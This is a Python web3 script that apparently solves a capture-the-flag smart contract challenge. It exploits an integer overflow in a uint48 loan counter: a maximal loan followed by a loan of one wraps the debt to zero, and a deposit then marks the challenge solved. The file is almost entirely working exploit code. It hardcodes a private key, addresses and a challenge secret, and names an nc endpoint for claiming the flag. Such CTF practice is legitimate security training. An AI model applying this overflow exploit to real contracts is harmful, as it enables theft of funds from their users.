from web3 import Web3


### CONSTANTS ###
RPC_URL = "http://34.30.117.150:47242"
PRIVATE_KEY = "0x4318eeacf357da9bc21e5026ac57070bc8d0a126917c009955d924bdb0707e9e"
PLAYER_ADDRESS = "0x2bab8E11621f77cfA6D60055531292AA2d2A9fc1"
CONTRACT_ADDRESS = "0x59e382A65AE318C05E3A03F7a5bf584AD162CE82"
SECRET = "2cc615254cc1167a3972e317e8838d5234579d4f79c34c83a95c2ba0d55da068"


### INITIALIZATIONS ###
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

CONTRACT_ABI = [
	{
		"inputs": [
			{
				"internalType": "uint48",
				"name": "amount",
				"type": "uint48"
			}
		],
		"name": "deposit",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getMoney",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isChallSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "solved",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint48",
				"name": "amount",
				"type": "uint48"
			}
		],
		"name": "loan",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint48",
				"name": "amount",
				"type": "uint48"
			}
		],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	}
]
contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)



### EXPLOIT ###
print('Current ether amount:',w3.from_wei(w3.eth.get_balance(PLAYER_ADDRESS), 'ether'))


# Get enough money from a loan to buy the flag
transaction = contract.functions.loan(2**48 - 1).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
    'chainId': w3.eth.chain_id
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(f"Transaction hash: {transaction_hash.hex()}")


# verify you have enough
print('Current ether amount:',w3.from_wei(w3.eth.get_balance(PLAYER_ADDRESS), 'ether'))


# Get 1 eth from loan so loan amount overflows to 0
transaction = contract.functions.loan(1).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
    'chainId': w3.eth.chain_id
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(f"Transaction hash: {transaction_hash.hex()}")


# deposit 2**48-1 eth so you can get the flag
transaction = contract.functions.deposit(2**48 - 1).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
    'value': 2**48 - 1,
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(f"Transaction hash: {transaction_hash.hex()}")


# ensure the challenge can be solved
print('Challenge solved?',contract.functions.isChallSolved().call())


# if it's solved, interact with nc 34.30.117.150 40001 again and put in your secret to get the flag